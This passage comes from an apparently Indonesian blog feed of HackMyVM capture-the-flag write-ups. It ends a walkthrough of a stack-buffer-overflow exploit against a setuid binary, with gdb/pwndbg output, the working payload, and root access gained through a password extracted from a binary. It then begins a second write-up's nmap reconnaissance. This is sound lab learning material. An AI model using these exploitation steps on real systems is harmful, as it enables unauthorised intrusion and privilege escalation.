learner:x:1000:1000:learner,,,:/home/learner:/bin/bash
</code></pre></div></div>
<p>karena sudah terjawab, maka saya melanjutkan sisi yang lain. karena memang cuma ada 2 user doang.</p>

<p>lanjut lagi, saya beranjak untuk menjalankan radare dan melihat isi <code class="language-plaintext highlighter-rouge">dissassembled code</code> dari fungsi <code class="language-plaintext highlighter-rouge">main</code>.</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â•­â”€ via <span class="o">[</span>machines/learn2code]
â•°â”€î˜‚ file MakeMeLearner                
MakeMeLearner: ELF 64-bit LSB pie executable, x86-64, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]<span class="o">=</span>bb387daabdaf0f68bfa1a29f8b8190c076dd6ad8, <span class="k">for </span>GNU/Linux 3.2.0, not stripped
â•­â”€ via <span class="o">[</span>machines/learn2code]
â•°â”€î˜‚ checksec MakeMeLearner
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/home/via/ctfs/hmv/machines/learn2code/MakeMeLearner'</span>
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled 
â•­â”€ via <span class="o">[</span>machines/learn2code]
â•°â”€î˜‚ gdb-pwndbg MakeMeLearner
Reading symbols from MakeMeLearner...
<span class="o">(</span>No debugging symbols found <span class="k">in </span>MakeMeLearner<span class="o">)</span>
pwndbg: loaded 197 commands. Type pwndbg <span class="o">[</span>filter] <span class="k">for </span>a list.
pwndbg: created <span class="nv">$rebase</span>, <span class="nv">$ida</span> gdb functions <span class="o">(</span>can be used with print/break<span class="o">)</span>
pwndbg&gt; r <span class="si">$(</span>python <span class="nt">-c</span> <span class="s1">'print("A"*80)'</span><span class="si">)</span>
Starting program: /home/via/ctfs/hmv/machines/learn2code/MakeMeLearner <span class="si">$(</span>python <span class="nt">-c</span> <span class="s1">'print("A"*80)'</span><span class="si">)</span>
<span class="o">[</span>Thread debugging using libthread_db enabled]
Using host libthread_db library <span class="s2">"/usr/lib/libthread_db.so.1"</span><span class="nb">.</span>
Change the <span class="s1">'modified'</span> variable value to <span class="s1">'0x61626364'</span> to be a learnerTry again, you got 0x41414141
<span class="o">[</span>Inferior 1 <span class="o">(</span>process 273577<span class="o">)</span> exited normally]
pwndbg&gt;
</code></pre></div></div>

<p>batin saya â€œhalah bajinganâ€, ga tau kenapa saya suka menantang diri saya tapi suka batin sendiri gini. bukan karena kesel, tapi karena saya tipikal hal yang suka repot tapi suka nyesel sendiri kalo udah masuk yang repot-repot gini.</p>

<p>Oke saya jelaskan dulu bagaimana proses <code class="language-plaintext highlighter-rouge">executable</code> di atas untuk bisa ditebak jalan kerjanya. kalo gini saya lebih enak menjelaskannya lewat <code class="language-plaintext highlighter-rouge">pwndbg</code>.
jika ingin melihat lebih jelas maka saya menjalankan <code class="language-plaintext highlighter-rouge">binary</code> tersebut dengan menggunakan jumlah random byte <code class="language-plaintext highlighter-rouge">80</code> untuk menguji apakah huruf <code class="language-plaintext highlighter-rouge">A</code> ini nanti masuk ke target yang dimaksudkan dan ternyata sudah masuk ke <code class="language-plaintext highlighter-rouge">stack</code> yaitu dengan nilai <code class="language-plaintext highlighter-rouge">0x41414141</code>.</p>

<p>jangan lupa untuk breakpoint di tempat yang penting!</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwndbg&gt; disass main
Dump of assembler code <span class="k">for function </span>main:
   0x0000555555555185 &lt;+0&gt;:	push   rbp
   0x0000555555555186 &lt;+1&gt;:	mov    rbp,rsp
   0x0000555555555189 &lt;+4&gt;:	sub    rsp,0x60
   0x000055555555518d &lt;+8&gt;:	mov    DWORD PTR <span class="o">[</span>rbp-0x54],edi
   0x0000555555555190 &lt;+11&gt;:	mov    QWORD PTR <span class="o">[</span>rbp-0x60],rsi
   0x0000555555555194 &lt;+15&gt;:	cmp    DWORD PTR <span class="o">[</span>rbp-0x54],0x1
   0x0000555555555198 &lt;+19&gt;:	jne    0x5555555551b0 &lt;main+43&gt;
   0x000055555555519a &lt;+21&gt;:	lea    rsi,[rip+0xe67]        <span class="c"># 0x555555556008</span>
   0x00005555555551a1 &lt;+28&gt;:	mov    edi,0x1
   0x00005555555551a6 &lt;+33&gt;:	mov    eax,0x0
   0x00005555555551ab &lt;+38&gt;:	call   0x555555555040 &lt;errx@plt&gt;
   0x00005555555551b0 &lt;+43&gt;:	lea    rdi,[rip+0xe71]        <span class="c"># 0x555555556028</span>
   0x00005555555551b7 &lt;+50&gt;:	mov    eax,0x0
   0x00005555555551bc &lt;+55&gt;:	call   0x555555555060 &lt;<span class="nb">printf</span>@plt&gt;
   0x00005555555551c1 &lt;+60&gt;:	mov    DWORD PTR <span class="o">[</span>rbp-0x4],0x0
   0x00005555555551c8 &lt;+67&gt;:	mov    rax,QWORD PTR <span class="o">[</span>rbp-0x60]
   0x00005555555551cc &lt;+71&gt;:	add    rax,0x8
   0x00005555555551d0 &lt;+75&gt;:	mov    rdx,QWORD PTR <span class="o">[</span>rax]
   0x00005555555551d3 &lt;+78&gt;:	lea    rax,[rbp-0x50]
   0x00005555555551d7 &lt;+82&gt;:	mov    rsi,rdx
   0x00005555555551da &lt;+85&gt;:	mov    rdi,rax
   0x00005555555551dd &lt;+88&gt;:	call   0x555555555030 &lt;strcpy@plt&gt;
   0x00005555555551e2 &lt;+93&gt;:	mov    eax,DWORD PTR <span class="o">[</span>rbp-0x4]
   0x00005555555551e5 &lt;+96&gt;:	cmp    eax,0x61626364
   0x00005555555551ea &lt;+101&gt;:	jne    0x55555555520e &lt;main+137&gt;
   0x00005555555551ec &lt;+103&gt;:	mov    edi,0x3e8
   0x00005555555551f1 &lt;+108&gt;:	call   0x555555555080 &lt;setuid@plt&gt;
   0x00005555555551f6 &lt;+113&gt;:	mov    edi,0x3e8
   0x00005555555551fb &lt;+118&gt;:	call   0x555555555070 &lt;setgid@plt&gt;
   0x0000555555555200 &lt;+123&gt;:	lea    rdi,[rip+0xe66]        <span class="c"># 0x55555555606d</span>
   0x0000555555555207 &lt;+130&gt;:	call   0x555555555050 &lt;system@plt&gt;
   0x000055555555520c &lt;+135&gt;:	jmp    0x555555555224 &lt;main+159&gt;
   0x000055555555520e &lt;+137&gt;:	mov    eax,DWORD PTR <span class="o">[</span>rbp-0x4]
   0x0000555555555211 &lt;+140&gt;:	mov    esi,eax
   0x0000555555555213 &lt;+142&gt;:	lea    rdi,[rip+0xe5d]        <span class="c"># 0x555555556077</span>
   0x000055555555521a &lt;+149&gt;:	mov    eax,0x0
   0x000055555555521f &lt;+154&gt;:	call   0x555555555060 &lt;<span class="nb">printf</span>@plt&gt;
   0x0000555555555224 &lt;+159&gt;:	mov    eax,0x0
   0x0000555555555229 &lt;+164&gt;:	leave  
   0x000055555555522a &lt;+165&gt;:	ret
pwndbg&gt; b <span class="k">*</span> 0x0000555555555185
Breakpoint 1 at 0x555555555185
pwndbg&gt; b <span class="k">*</span> 0x00005555555551bc
Breakpoint 2 at 0x5555555551bc
</code></pre></div></div>
<p>ketika saya jalankan, saya melihat ada <code class="language-plaintext highlighter-rouge">0x7fffffffdf08</code> sebagai nilai dari <code class="language-plaintext highlighter-rouge">RSP</code> pertama. bagaimana jika saya melanjutkan ke instruksi untuk ketiga kalinya maka saya bisa menebak kalau itu adalah ketetapan <code class="language-plaintext highlighter-rouge">RSP</code> yang terus menerus bergeser sampai ke bagian <code class="language-plaintext highlighter-rouge">stack low memory</code>. Dari sini saya ingin melihat berapa nilai byte dari <code class="language-plaintext highlighter-rouge">RBP</code> nantinya.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   0x555555555185 &lt;main&gt;       push   rbp -&gt; RSP 0x7fffffffdf08
 â–º 0x555555555186 &lt;main+1&gt;     mov    rbp, rsp -&gt; RSP  0x7fffffffdf00 â—‚â€” 0x2 &amp; RBP have a same value.
</code></pre></div></div>
<p>Bisa diketahui <code class="language-plaintext highlighter-rouge">base</code> dari <code class="language-plaintext highlighter-rouge">RBP</code> adalah <code class="language-plaintext highlighter-rouge">8 bytes</code>. lalu pada instruksi selanjutnya?</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   0x555555555189 &lt;main+4&gt;     sub    rsp, 0x60 -&gt; RSP 0x7fffffffdf00 
 â–º 0x55555555518d &lt;main+8&gt;     mov    dword ptr [rbp - 0x54], edi -&gt; *RSP  0x7fffffffdea0 â—‚â€” 0x400000009 /* '\t' */
</code></pre></div></div>
<p>pada <code class="language-plaintext highlighter-rouge">0x555555555189</code> terdapat nilai <code class="language-plaintext highlighter-rouge">0x60</code> yang artinya <code class="language-plaintext highlighter-rouge">96</code> secara desimal dan itu akan disubstraksikan dengan <code class="language-plaintext highlighter-rouge">rsp</code>. karena saya penasaran berapa hasil dari nilai stack <strong>X = <code class="language-plaintext highlighter-rouge">0x7fffffffdea0</code> - <code class="language-plaintext highlighter-rouge">0x7fffffffdf00</code></strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â•­â”€ via [machines/learn2code]
â•°â”€î˜‚ rax2 0x7fffffffdf00 - 0x7fffffffdea0
140737488346880
140737488346784
â•­â”€ via [machines/learn2code]
â•°â”€î˜‚ expr 140737488346880 - 140737488346784
96
</code></pre></div></div>
<p>maka nilai <strong>X = 96</strong>.<br />
Well kalau begini artinya <code class="language-plaintext highlighter-rouge">RBP = 8</code> dan <code class="language-plaintext highlighter-rouge">RSP = 96</code>.</p>

<p>Lalu saya melanjutkan lagi sampai pada <code class="language-plaintext highlighter-rouge">0x5555555551c8</code> karena instruksi <code class="language-plaintext highlighter-rouge">rax</code> berubah menjadi <code class="language-plaintext highlighter-rouge">0x44</code> yang arti desimalnya adalah <code class="language-plaintext highlighter-rouge">68</code>. yang jika dikurangi nilai <code class="language-plaintext highlighter-rouge">rbp = 88</code> ke <code class="language-plaintext highlighter-rouge">rax</code> maka, <code class="language-plaintext highlighter-rouge">20</code>.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwndbg&gt; x/30wx $rsp
0x7fffffffdea0:	0xffffe018	0x00007fff	0x00000000	0x00000002
0x7fffffffdeb0:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffdec0:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffded0:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffdee0:	0x00000000	0x00000000	0xf7fe6c00	0x00007fff
0x7fffffffdef0:	0x00000000	0x00000000	0xf7ffdab0	0x00000000
0x7fffffffdf00:	0x00000002	0x00000000	0xf7dd7290	0x00007fff
0x7fffffffdf10:	0xffffe000	0x00007fff
pwndbg&gt; x/i $rsp
   0x7fffffffdea0:	sbb    al,ah
pwndbg&gt; x/i $rip
=&gt; 0x5555555551d3 &lt;main+78&gt;:	lea    rax,[rbp-0x50]
</code></pre></div></div>
<p>wait, saya malah bingung ini. kalau <code class="language-plaintext highlighter-rouge">rbp-0x50</code> adalah <code class="language-plaintext highlighter-rouge">80</code> terus untuk apa?. 
ataukah berarti <code class="language-plaintext highlighter-rouge">16 bytes</code> atau satu <code class="language-plaintext highlighter-rouge">stack frame</code> dari <code class="language-plaintext highlighter-rouge">0x7fffffffdea0</code> itu tidak dipakai? atau bagaimana?</p>

<p>karena saya orangnya bodoamatan maka saya akan melanjutkan dengan melihat ekstraksi sampai menemukan hal yang janggal.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> â–º 0x5555555551dd &lt;main+88&gt;     call   strcpy@plt                &lt;strcpy@plt&gt;
        dest: 0x7fffffffdeb0 â—‚â€” 0x0
        src: 0x7fffffffe31e â—‚â€” 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
</code></pre></div></div>
<p>di atas ini adalah kejanggalan saya di mana nilai <code class="language-plaintext highlighter-rouge">bunch of A's</code> adalah <code class="language-plaintext highlighter-rouge">src</code> ditetapkan pada address <code class="language-plaintext highlighter-rouge">0x7fffffffe31e</code>? lalu <code class="language-plaintext highlighter-rouge">dest</code> dengan address <code class="language-plaintext highlighter-rouge">0x7fffffffdeb0</code> memiliki nilai <code class="language-plaintext highlighter-rouge">0x0</code>, hadeh. yang tadinya kirain saya ekstraksinya bakalan waw ternyata sama saja.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwndbg&gt; x/30wx $rsp
0x7fffffffdea0:	0xffffe018	0x00007fff	0x00000000	0x00000002
0x7fffffffdeb0:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffdec0:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffded0:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffdee0:	0x00000000	0x00000000	0xf7fe6c00	0x00007fff
0x7fffffffdef0:	0x00000000	0x00000000	0xf7ffdab0	0x00000000
0x7fffffffdf00:	0x00000002	0x00000000	0xf7dd7290	0x00007fff
0x7fffffffdf10:	0xffffe000	0x00007fff
</code></pre></div></div>
<p>lihat? nilai <code class="language-plaintext highlighter-rouge">0xdeb0</code> masih <code class="language-plaintext highlighter-rouge">0x0</code>. ketika saya <code class="language-plaintext highlighter-rouge">next instruction</code> lagi, saya mendapatkan sesuatu yang menakjubkan pada ekstraksi dan <code class="language-plaintext highlighter-rouge">instruction</code> yang ada di <code class="language-plaintext highlighter-rouge">dissassembled code</code>,</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> â–º 0x5555555551e2 &lt;main+93&gt;     mov    eax, dword ptr [rbp - 4]
   0x5555555551e5 &lt;main+96&gt;     cmp    eax, 0x61626364 

pwndbg&gt; x/30wx $rsp
0x7fffffffdea0:	0xffffe018	0x00007fff	0x00000000	0x00000002
0x7fffffffdeb0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffdec0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffded0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffdee0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffdef0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffdf00:	0x00000000	0x00000000	0xf7dd7290	0x00007fff
0x7fffffffdf10:	0xffffe000	0x00007fff
</code></pre></div></div>
<p>maka jika <code class="language-plaintext highlighter-rouge">0x50</code> adalah 80, saya memastikan bahwa tadi yang mana <code class="language-plaintext highlighter-rouge">rbp-0x50</code> lalu bertemu dengan nilai <code class="language-plaintext highlighter-rouge">rax</code> adalah <code class="language-plaintext highlighter-rouge">0x44</code> dan nilai asli <code class="language-plaintext highlighter-rouge">rbp</code> adalah <code class="language-plaintext highlighter-rouge">0x8</code> maka jawaban yang tepat untuk mengisi huhu :( itu berarti <code class="language-plaintext highlighter-rouge">4</code>. dan <code class="language-plaintext highlighter-rouge">0x50 - 0x4</code> = <code class="language-plaintext highlighter-rouge">76 bytes</code> untuk jumlah <code class="language-plaintext highlighter-rouge">A</code> dan + 4 dengan nilai <code class="language-plaintext highlighter-rouge">dcba</code> yang artinya <code class="language-plaintext highlighter-rouge">0x61626364</code> biar nilainya sama jika dikomparasi dan bisa mendapatkan shell dari <code class="language-plaintext highlighter-rouge">learner</code>.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x55555555521f &lt;main+154&gt;           call   printf@plt                &lt;printf@plt&gt;
        format: 0x555555556077 â—‚â€” 'Try again, you got 0x%08x\n'
        vararg: 0x41414141
</code></pre></div></div>
<p>see? failed. dan benar ini seperti sudah melebihi karena <code class="language-plaintext highlighter-rouge">vararg</code> itu jumlah <code class="language-plaintext highlighter-rouge">A</code> yang mempunyai nilai hex <code class="language-plaintext highlighter-rouge">0x41414141</code>.</p>

<div style="padding-top: 5x"></div>

<p>dengan <code class="language-plaintext highlighter-rouge">run $(python -c 'print("A"*76)')</code>. bagian stack <code class="language-plaintext highlighter-rouge">0x7fffffffdefc</code> mempunyai ekstraksi <code class="language-plaintext highlighter-rouge">0x00000000</code> yang mana ini harus dimodifikasi menjadi <code class="language-plaintext highlighter-rouge">dcba</code> agar nantinya melengkapi nilai keseluruhan buffer <code class="language-plaintext highlighter-rouge">80</code>.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwndbg&gt; x/4x 0x7fffffffdef0
0x7fffffffdef0:	0x41414141	0x41414141	0x41414141	0x00000000 --&gt; 0xdefc
pwndbg&gt; 
</code></pre></div></div>
<h2 id="shell-as-learner">shell as learner</h2>
<p>Dan jika saya coba.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@Learn2Code:/dev/shm$ /usr/bin/MakeMeLearner $(python -c 'print("A"*76 + "dcba")')
learner@Learn2Code:/dev/shm$ cat /home/learner/user.txt
N1c3m0veMat3!
</code></pre></div></div>
<h2 id="privilege-escalation">privilege escalation</h2>

<p>ini cuma decompile dan urusan bakal selesai.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>learner@Learn2Code:/home/learner$ ls
MySecretPasswordVault  linpeas.sh  user.txt
learner@Learn2Code:/home/learner$
</code></pre></div></div>
<p>yap, saya telah menggunakan <code class="language-plaintext highlighter-rouge">linpeas.sh</code> tapi tetap tidak memunculkan jalan alternatif untuk eskalasi. dan di atas cuma ada <code class="language-plaintext highlighter-rouge">MySecretPasswordVault</code> executable yang harus ditelisik lagi huh.</p>

<p>transfer <em>executable</em> itu ke local machine dan analyzing menggunakan <code class="language-plaintext highlighter-rouge">radare2</code>.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â”‚           0x55ecd261c13d      488d05c40e00.  lea rax, str.NOI98hO    ; 0x55ecd261d008 ; "NOI98hO"
â”‚           0x55ecd261c144      488945f8       mov qword [var_8h], rax
â”‚           0x55ecd261c148      488d05c10e00.  lea rax, [0x55ecd261d010] ; "Ihj"
â”‚           0x55ecd261c14f      488945f0       mov qword [var_10h], rax
â”‚           0x55ecd261c153      488d05ba0e00.  lea rax, str.__Jj       ; 0x55ecd261d014 ; ")(Jj"
</code></pre></div></div>
<p>dan jika disusun akan menjadi <code class="language-plaintext highlighter-rouge">NOI98hOIhj)(Jj</code>.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>learner@Learn2Code:/home/learner$ su root
Password: 
root@Learn2Code:/home/learner# cat /root/root.txt
Y0uG0TitbR0!
</code></pre></div></div>

<h2 id="references">References</h2>
<ul>
  <li><a href="https://infosecwriteups.com/into-the-art-of-binary-exploitation-0x000001-stack-based-overflow-50fe48d58f10">https://infosecwriteups.com/into-the-art-of-binary-exploitation-0x000001-stack-based-overflow-50fe48d58f10</a></li>
  <li><a href="https://hacksland.net/protostar-stack0-tutorial">https://hacksland.net/protostar-stack0-tutorial</a></li>
  <li><a href="https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes">https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes</a></li>
  <li><a href="https://github.com/rosehgal/BinExp/blob/master/Lecture2/README.md">https://github.com/rosehgal/BinExp/blob/master/Lecture2/README.md</a></li>
  <li><a href="https://github.com/PHPGangsta/GoogleAuthenticator/blob/master/PHPGangsta/GoogleAuthenticator.php">https://github.com/PHPGangsta/GoogleAuthenticator/blob/master/PHPGangsta/GoogleAuthenticator.php</a></li>
  <li><a href="https://gist.github.com/sharpicx/c70f69eb8fe318bf8979b095a3a34012">https://gist.github.com/sharpicx/c70f69eb8fe318bf8979b095a3a34012</a></li>
</ul>]]></content><author><name></name></author><category term="hackmyvm" /><category term="php-code-authentication" /><category term="bypass-python-sandbox" /><category term="RCE" /><category term="stack-based overflow" /><category term="reversing" /><summary type="html"><![CDATA[Mesin dengan tingkat kesulitan Medium dan semua kasus yang berbau basic untuk pengenalan exploit development dan seterusnya. Tingkat privilege escalation yang tidak begitu sulit karena tinggal analisis dan extract string saja. Well, lumayan membuang-buang waktu juga sih karena saya tidak terbiasa dengan pwn hehe, karena soal ini saya mempelajari banyak hal dan menyukai exploit development!. Mari simak!]]></summary></entry><entry><title type="html">HackMyVM: Discover</title><link href="http://localhost:4000/hmv-discover" rel="alternate" type="text/html" title="HackMyVM: Discover" /><published>2022-09-09T00:00:00+07:00</published><updated>2022-09-09T00:00:00+07:00</updated><id>http://localhost:4000/hmv-discover</id><content type="html" xml:base="http://localhost:4000/hmv-discover"><![CDATA[<p>Yap, sudah lama sekali saya tidak menulis blog. Post kali ini saya membagikan writeup yang saya selesaikan untuk machine <em>Discover</em> yang disediakan oleh <a href="https://hackmyvm.eu">HackMyVM</a>.
Dari mulai scanning nmap, fuzzing subdomain, lalu mencoba testing pada web application dan menemukan celah <em>command injection</em> sampai pada tahap privilege escalation yang membosankan karena
saya perlu untuk membaca dokumentasi glasshfish (sebuah service <em>Java</em> untuk web application).</p>

<h2 id="recon">Recon</h2>
<h3 id="nmap-scanning">nmap scanning</h3>
<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:35
Completed NSE at 11:35, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:35
Completed NSE at 11:35, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:35
Completed NSE at 11:35, 0.00s elapsed
Initiating Ping Scan at 11:35
Scanning 192.168.56.8 [2 ports]
Completed Ping Scan at 11:35, 0.00s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 11:35
Completed Parallel DNS resolution of 1 host. at 11:35, 6.52s elapsed
DNS resolution of 1 IPs took 6.61s. Mode: Async [#: 2, OK: 0, NX: 0, DR: 1, SF: 2, TR: 4, CN: 0]
Initiating Connect Scan at 11:35
Scanning 192.168.56.8 [7 ports]
Discovered open port 8080/tcp on 192.168.56.8
Discovered open port 80/tcp on 192.168.56.8
Discovered open port 8181/tcp on 192.168.56.8
Discovered open port 4848/tcp on 192.168.56.8
Discovered open port 3700/tcp on 192.168.56.8
Discovered open port 7676/tcp on 192.168.56.8
Discovered open port 8686/tcp on 192.168.56.8
Completed Connect Scan at 11:35, 0.00s elapsed (7 total ports)
Initiating Service scan at 11:35
Scanning 7 services on 192.168.56.8
Completed Service scan at 11:37, 134.64s elapsed (7 services on 1 host)
NSE: Script scanning 192.168.56.8.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:37
NSE Timing: About 99.48% done; ETC: 11:38 (0:00:00 remaining)
Completed NSE at 11:38, 31.54s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:38
Completed NSE at 11:38, 3.60s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:38
Completed NSE at 11:38, 0.00s elapsed
Nmap scan report for 192.168.56.8
Host is up, received syn-ack (0.00053s latency).
Scanned at 2022-09-09 11:35:28 WIB for 170s
warning: ruby-getoptlong will be installed before its ruby dependency
PORT     STATE SERVICE              REASON  VERSION
80/tcp   open  http                 syn-ack Apache httpd 2.4.54
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: Did not follow redirect to http://discover.hmv/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
3700/tcp open  giop                 syn-ack CORBA naming service
|_giop-info: ERROR: Script execution failed (use -d to debug)
4848/tcp open  appserv-http?        syn-ack
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 202 Accepted
|     Server: Eclipse GlassFish 6.1.0 
|     X-Powered-By: Servlet/5.0 JSP/3.0(Eclipse GlassFish 6.1.0 Java/Debian/11)
|     Content-Type: text/html;charset=UTF-8
|     Connection: close
|     Content-Length: 6008
|     <span class="cp">&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"&gt;</span>
|     <span class="nt">&lt;html</span> <span class="na">xmlns=</span><span class="s">"http://www.w3.org/1999/xhtml"</span> <span class="na">xml:lang=</span><span class="s">"en"</span> <span class="na">lang=</span><span class="s">"en"</span><span class="nt">&gt;</span>
|     <span class="nt">&lt;head&gt;</span>
|     <span class="c">&lt;!--
|     Copyright (c) 2010, 2018 Oracle and/or its affiliates. All rights reserved.
|     This program and the accompanying materials are made available under the
|     terms of the Eclipse Public License v. 2.0, which is available at
|     http://www.eclipse.org/legal/epl-2.0.
|     This Source Code may also be made available under the following Secondary
|     Licenses when the conditions for such availability set forth in the
|     Eclipse Public License v. 2.0 are satisfied: GNU General Public Lic
|   HTTPOptions: 
|     HTTP/1.1 405 OPTIONS method is not allowed
|     Server: Eclipse GlassFish 6.1.0 
|     X-Powered-By: Servlet/5.0 JSP/3.0(Eclipse GlassFish 6.1.0 Java/Debian/11)
|     Allow: GET, POST, HEAD, DELETE, PUT
|     Connection: close
|     Content-Length: 0
|   RTSPRequest: 
|     HTTP/1.1 505 HTTP Version Not Supported
|     Server: Eclipse GlassFish 6.1.0 
|     X-Powered-By: Servlet/5.0 JSP/3.0(Eclipse GlassFish 6.1.0 Java/Debian/11)
|     Date: Fri, 09 Sep 2022 04:35:31 GMT
|     Connection: close
|_    Content-Length: 0
7676/tcp open  java-message-service syn-ack Java Message Service 301
8080/tcp open  http-proxy           syn-ack Eclipse GlassFish  6.1.0 
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Eclipse GlassFish 6.1.0 
|     X-Powered-By: Servlet/5.0 JSP/3.0(Eclipse GlassFish 6.1.0 Java/Debian/11)
|     Date: Fri, 09 Sep 2022 04:35:25 GMT
|     Content-Type: text/html
|     Connection: close
|     Content-Length: 3668
|     &lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"&gt;
|     &lt;html lang="en"&gt;
|     &lt;!--
|     Copyright (c) 2010, 2018 Oracle and/or its affiliates. All rights reserved.
|     Copyright (c) 2020 Contributors to the Eclipse Foundation.
|     This program and the accompanying materials are made available under the
|     terms of the Eclipse Public License v. 2.0, which is available at
|     http://www.eclipse.org/legal/epl-2.0.
|     This Source Code may also be made available under the following Secondary
|     Licenses when the conditions for such availability set forth in the
|     Eclipse Public License v. 2.0 are satisfied: GNU General Public License,
|     version 2 with the
|   HTTPOptions: 
|     HTTP/1.1 405 Method Not Allowed
|     Server: Eclipse GlassFish 6.1.0 
|     X-Powered-By: Servlet/5.0 JSP/3.0(Eclipse GlassFish 6.1.0 Java/Debian/11)
|     Allow: GET
|     Connection: close
|     Content-Length: 0
|   RTSPRequest: 
|     HTTP/1.1 505 HTTP Version Not Supported
|     Server: Eclipse GlassFish 6.1.0 
|     X-Powered-By: Servlet/5.0 JSP/3.0(Eclipse GlassFish 6.1.0 Java/Debian/11)
|     Date: Fri, 09 Sep 2022 04:35:25 GMT
|     Connection: close
|_    Content-Length: 0
|_http-server-header: Eclipse GlassFish  6.1.0 
|_http-title: Eclipse GlassFish - Server Running
| http-methods: 
|   Supported Methods: GET HEAD POST PUT DELETE TRACE OPTIONS
|_  Potentially risky methods: PUT DELETE TRACE
|_http-open-proxy: Proxy might be redirecting requests
8181/tcp open  intermapper?         syn-ack
| tls-alpn: 
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=localhost/organizationName=Eclipse.org Foundation Inc/stateOrProvinceName=Ontario/countryName=CA/organizationalUnitName=GlassFish/localityName=Ottawa
| Issuer: commonName=localhost/organizationName=Eclipse.org Foundation Inc/stateOrProvinceName=Ontario/countryName=CA/organizationalUnitName=GlassFish/localityName=Ottawa
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-05-22T16:19:00
| Not valid after:  2031-05-20T16:19:00
| MD5:   0b58 ea49 e0e1 0013 67a0 0ede d007 fb84
| SHA-1: 5dea 602a 3d43 65fd a141 3bb5 bea0 2320 f87a cb96
| -----BEGIN CERTIFICATE-----
| MIIDmTCCAoGgAwIBAgIEFr+FQDANBgkqhkiG9w0BAQsFADB9MQswCQYDVQQGEwJD
| QTEQMA4GA1UECBMHT250YXJpbzEPMA0GA1UEBxMGT3R0YXdhMSMwIQYDVQQKExpF
| Y2xpcHNlLm9yZyBGb3VuZGF0aW9uIEluYzESMBAGA1UECxMJR2xhc3NGaXNoMRIw
| EAYDVQQDEwlsb2NhbGhvc3QwHhcNMjEwNTIyMTYxOTAwWhcNMzEwNTIwMTYxOTAw
| WjB9MQswCQYDVQQGEwJDQTEQMA4GA1UECBMHT250YXJpbzEPMA0GA1UEBxMGT3R0
| YXdhMSMwIQYDVQQKExpFY2xpcHNlLm9yZyBGb3VuZGF0aW9uIEluYzESMBAGA1UE
| CxMJR2xhc3NGaXNoMRIwEAYDVQQDEwlsb2NhbGhvc3QwggEiMA0GCSqGSIb3DQEB
| AQUAA4IBDwAwggEKAoIBAQDI1/xR4GcIAsIfJ+BCb7q/NZvwLkhDthYkR20kCpia
| LXyHfu697WTGCMe9jywBEYpa5JMge4ubOqLWwhZq9xAcVo1kv/t9iYByrgbOzvLT
| FvxlfWv5beeRQADo9r+PwtPNbWD+VzPTASEWNs7GDOV1nTzyXVDUgzNBwJWk9waI
| qCOyvfWb9Bl9moQLD0amNp6iCKIsEU+bpvREZFBoN6CiYcQdmkO5ie8hwbxPhQOk
